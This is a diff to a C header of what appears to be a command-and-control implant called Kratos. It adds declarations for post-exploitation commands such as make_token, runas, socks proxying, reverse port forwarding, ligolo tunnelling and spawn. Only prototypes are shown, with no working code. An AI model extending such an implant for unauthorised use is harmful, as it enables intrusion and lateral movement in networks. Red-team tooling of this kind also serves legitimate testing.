@@ -21,6 +21,15 @@ void command_ifconfig(char *task_id, char *params);
 void command_download(char *task_id, char *params);
 void command_upload(char *task_id, char *params);
 void command_steal_token(char *task_id, char *params);
+void command_make_token(char *task_id, char *params);
+void command_runas(char *task_id, char *params);
 void command_rev2self(char *task_id, char *params);
+void command_socks(char *task_id, char *params);
+void command_rportfwd(char *task_id, char *params);
+void command_ligolo_start(char *task_id, char *params);
+void command_ligolo_stop(char *task_id, char *params);
+void command_ligolo_status(char *task_id, char *params);
+void command_spawnto(char *task_id, char *params);
+void command_spawn(char *task_id, char *params);
 
 #endif // KRATOS_COMMANDS_H
